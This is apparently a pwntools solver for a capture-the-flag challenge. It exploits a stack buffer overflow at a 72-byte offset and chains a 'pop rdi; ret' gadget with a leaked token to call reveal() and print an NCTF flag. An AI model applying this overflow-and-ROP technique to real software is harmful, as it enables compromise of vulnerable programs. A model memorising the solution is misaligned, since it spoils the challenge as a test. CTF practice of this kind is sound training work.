#!/usr/bin/env python3
"""Solver for ret2win-keyed.

reveal(k) only decodes the flag when k == token, and token is printed once at
startup and randomised per run. The System-V ABI passes the first argument in
RDI, so a plain ret2win is not enough: we chain `pop rdi; ret` to load the
leaked token into RDI, then return into reveal().

vuln() reads 256 bytes into a 64-byte buffer (buf at rbp-0x40), so the saved
return address is 72 bytes in.
"""
import os
import re

from pwn import ELF, context, p64, process

context.log_level = "error"

HERE = os.path.dirname(os.path.abspath(__file__))
BIN = os.path.join(HERE, "..", "chall")

OFFSET = 72


def main() -> None:
    elf = ELF(BIN, checksec=False)
    pop_rdi = elf.symbols["gadget_pop_rdi"]
    reveal = elf.symbols["reveal"]

    p = process(BIN)
    line = p.recvline()  # "token: 0x...."
    token = int(re.search(rb"0x([0-9a-f]+)", line).group(1), 16)
    p.recvline()  # "send your data:"

    payload = b"A" * OFFSET
    payload += p64(pop_rdi) + p64(token) + p64(reveal)
    p.send(payload)

    out = p.recvall(timeout=5)
    p.close()

    m = re.search(rb"NCTF\{[^}]*\}", out)
    assert m, f"no flag in output: {out!r}"
    print(m.group(0).decode())


if __name__ == "__main__":
    main()
